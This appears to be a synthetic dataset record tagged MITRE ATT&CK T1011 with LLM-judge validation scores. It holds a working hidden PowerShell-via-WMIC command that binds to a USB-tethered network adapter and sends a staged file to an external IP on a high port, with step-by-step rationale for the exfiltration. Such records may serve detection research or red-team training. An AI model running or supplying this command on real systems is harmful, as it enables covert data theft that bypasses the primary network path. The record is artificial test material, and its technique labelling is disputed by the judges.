{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Remote NDIS*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.199',50888); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\stage.log'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "explanation": "Uses WMIC to invoke PowerShell that binds to a USB tethering (Remote NDIS) adapter and exfiltrates a file to an external host using a high TCP port. This exploits a USB-backed network path distinct from the primary NIC.",
  "rationale_steps": [
    "Detect a USB tethering NIC via its Remote NDIS description.",
    "Bind the TCP client to that interface to force egress over USB tether.",
    "Connect to an uncommon port on the exfiltration server.",
    "Send the selected file over the alternate network medium per T1011.",
    "Refrain from system-level network configuration changes."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-987933e0-e65af2df",
  "source_prompt_hash": "987933e0",
  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
  "validation": {
    "syntax_ok": true,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Quoting and delimiters are balanced, WMIC invocation is valid, and the embedded PowerShell pipeline and .NET calls are syntactically sound and parseable.",
        "semantic_score": 2,
        "semantic_justification": "While it exfiltrates a file via TCP bound to a USB-tethered (RNDIS) network interface, it does not move data to a removable physical medium for physical transport, making it misaligned with T1011 as described.",
        "combined_score": 3.5,
        "confidence": 0.83,
        "timestamp": "2025-10-01T08:05:35.923473Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, with correct PowerShell syntax including variable declarations, method calls, and pipeline operations.",
        "semantic_score": 4,
        "semantic_justification": "The command effectively implements the T1011 technique by identifying a USB-connected network adapter (Remote NDIS) and using it to exfiltrate data over a TCP connection, though it lacks the encryption or compression elements often seen in sophisticated exfiltration.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-01T08:05:39.223971Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, using correct WMIC syntax, proper PowerShell command-line arguments, and correct escaping for variables within the double-quoted PowerShell script.",
        "semantic_score": 1,
        "semantic_justification": "The command performs network exfiltration via a USB-backed network interface, which semantically aligns with T1041 (Exfiltration Over Network Medium), not T1011 (Exfiltration Over Physical Medium) which involves transferring data *onto* a physical medium for physical transport.",
        "combined_score": 3.0,
        "confidence": 0.9,
        "timestamp": "2025-10-01T08:05:59.894341Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 2.333,
    "llm_average_score": 3.667,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null,
    "Syntax_Run_Details": ""
  }
}
